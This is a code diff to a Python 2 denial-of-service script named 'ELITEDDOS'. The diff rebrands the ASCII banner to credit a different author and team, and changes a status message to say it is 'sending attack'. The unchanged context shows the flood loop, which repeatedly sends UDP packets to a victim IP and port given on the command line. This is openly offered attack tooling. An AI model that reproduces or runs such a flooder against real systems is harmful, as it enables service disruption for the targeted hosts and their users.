@@ -3,18 +3,16 @@ import socket
 import random
 import sys
 def usage():
-    print "\033[1;32m#########################################################"
-    print "#------------------------[\033[1;91mELITEDDOS\033[1;32m]---------------------#"
-    print "#-------------------------------------------------------#"
-    print "#   \033[1;91mCommand: " "python2 ELITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
-    print "#                                                       #"
-    print "#\033[1;91mCreator:KeepAlive  \033[1;32m##      ###       ##                #"
-    print "#\033[1;91mTeam   : ISL        \033[1;32m##     #          ##                #"
-    print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
-    print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
-    print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
-    print "#               \033[1;91m<--[Indonesia Security Lite]-->         \033[1;32m#"
-    print "#########################################################"
+    print "\033[1;32m_________________________________________________________"
+    print "------------------------[\033[1;91mELITEDDOS\033[1;32m]---------------------#"
+    print "-------------------------------------------------------#"
+    print "   \033[1;91mCommand: " "python2 ELITEDDOS.py " "[ip] [port] [packet]"
+    print "                                                                                    "
+    print "\033[1;91mTools By.      :Mr.Jesh29"
+    print "\033[1;91mTeam           : Muslim Cyber Fighter"
+    print "\033[1;91mChannel YouTube:muslim cyber fighter        \033[1;32m                             "
+    print "             \033[1;91m [MUSLIM CYBER FIGHTER]"
+    print "____________________________________________________________________"
     print "                        @@@@@@@@@@"
     print "                       @@@@@@@@@@@@"
     print "                     @@@@@@@@@@@@@@@@"
@@ -34,7 +32,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim serangan \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
